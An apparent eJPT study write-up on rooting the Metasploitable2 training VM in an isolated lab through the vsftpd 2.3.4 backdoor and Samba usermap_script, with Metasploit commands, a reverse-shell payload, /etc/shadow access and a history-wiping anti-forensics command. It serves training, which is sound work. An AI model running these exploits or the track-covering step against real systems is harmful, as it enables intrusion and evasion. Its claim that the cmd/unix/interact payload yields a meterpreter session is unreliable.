# Two CVEs, One Root: Comparing Independent Exploitation Paths on Metasploitable2

**Day:** 17
**Track:** eJPT prep — Host/Network Pentesting module
**Lab:** Isolated VirtualBox host-only network (vboxnet0)
**Attacker:** Kali VM — 192.168.56.102
**Target:** Metasploitable2 — 192.168.56.101

## Scope

All testing performed in an isolated, self-hosted lab against Metasploitable2,
a deliberately vulnerable training VM. No production or third-party systems
were involved.

## Objective

Metasploitable2 exposes a large attack surface (28 open ports from an
earlier Nmap sweep, vs. 4 on a hardened comparison target). Rather than stop
at the first working exploit, the goal here was to demonstrate that **attack
surface, not any single vulnerability, is the real risk** — by getting root
through two completely independent CVEs and proving both land on the same
underlying system.

## Recon recap

Full TCP port scan against 192.168.56.101 identified, among others:

| Port | Service | Notable |
|---|---|---|
| 21 | vsftpd 2.3.4 | Known backdoored release — CVE-2011-2523 |
| 139/445 | Samba (smbd) | Vulnerable to `usermap_script` RCE — CVE-2007-2447 |
| 6667/6697 | UnrealIRCd | Backdoored — CVE-2010-2075 (not chased this session) |
| 5432 | PostgreSQL | Default creds suspected — not chased this session |

## Path 1 — vsftpd 2.3.4 backdoor (CVE-2011-2523)

**Vulnerability class:** Intentional backdoor in a compromised source
distribution — not a memory-corruption bug. A username containing the
string `:)` triggers a listener bound to port 6200 that hands back a shell.

**Confirmation before exploitation:**
```
searchsploit vsftpd 2.3.4
searchsploit -x unix/remote/49757.py
```
Reading the exploit source first confirmed the mechanism (trigger string →
port 6200 shell) before running anything against the target.

**Exploitation:**
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.56.101
msf6 > set payload cmd/unix/interact
msf6 > set LHOST 192.168.56.102
msf6 > run
```
Result: immediate root shell via Metasploit.

**Verification:**
```
whoami / getuid → root
```

## Path 2 — Samba `usermap_script` RCE (CVE-2007-2447)

**Vulnerability class:** Unsanitized input reaching a shell command via
Samba's `mkuser.sh` username-mapping script — classic command injection,
architecturally unrelated to the vsftpd backdoor.

**Exploitation:**
```
msf6 > use exploit/multi/samba/usermap_script
msf6 > set RHOSTS 192.168.56.101
msf6 > set payload cmd/unix/reverse
msf6 > set LHOST 192.168.56.102
msf6 > run
```
Result: root shell, this time a raw non-interactive shell rather than a
meterpreter session.

**Verification:**
```
root@metasploitable:/# whoami
root
```

## Confirming both paths hit the same target

To prove the two exploits weren't landing on different systems or user
contexts, `/etc/shadow` was hashed from both sessions independently:

```
md5sum /etc/shadow
ccbef84a758831685f9f4fb89382ebdf  /etc/shadow
```

Matching hashes from both the vsftpd (meterpreter) and Samba (raw shell)
sessions confirm identical filesystem state — same box, two independent
doors in.

## Shell quality: meterpreter vs. raw shell

The two payloads produced noticeably different working environments:

- **vsftpd path (`cmd/unix/interact`):** meterpreter session — structured
  command set (`sysinfo`, `getuid`, `shell` to drop to bash), session
  management (`background`, `sessions -l`).
- **Samba path (`cmd/unix/reverse`):** raw bash — no job control, breaks on
  interactive tools. Upgraded to a working TTY with:
  ```
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```

Worth noting for anyone building the same chain: the *payload choice*
matters as much as the exploit itself for post-ex usability, independent of
which CVE got you in.

## Anti-forensics detail

```
lrwxrwxrwx 1 root root 9 May 14 2012 .bash_history -> /dev/null
```

`/root/.bash_history` is a symlink to `/dev/null` — history is never
written. This is Metasploitable2's deliberate design, but it mirrors a real
technique attackers use post-compromise to avoid leaving a command trail
(`ln -sf /dev/null ~/.bash_history`).

## Internal vs. external attack surface

`netstat -antp` from inside the box surfaced services not visible in the
original external Nmap sweep — notably DNS control (`127.0.0.1:953`) and
NFS/RPC services (`rpc.statd`, `rpc.mountd` on high ports) bound to
localhost or registered dynamically via portmap. A purely external scan
undercounts what's actually running.

## Takeaways

- **Attack surface compounds risk.** One hardened box (4 open ports) vs.
  this one (28+) is the clearest practical illustration of why minimizing
  exposed services matters more than patching any single CVE.
- **Vulnerability confirmation before exploitation** (`searchsploit -x`
  reading exploit source first) is cheap and turns "I think this might
  work" into "I know what this does before I run it."
- **Payload choice shapes post-ex, not just delivery.** Same target, same
  privilege level, meaningfully different working shell depending on the
  payload picked.
- **Cross-session verification** (matching `/etc/shadow` hashes) is a
  simple way to prove two exploitation paths are hitting the same target —
  useful whenever a writeup claims multiple vectors on one host.

## Next steps

- Pull `/etc/passwd` and any crackable hashes into `john`/`hashcat` for a
  full crack-and-report chain.
- Move into privilege escalation content proper (moot on this box since
  both paths land directly at root — worth a target that requires it).
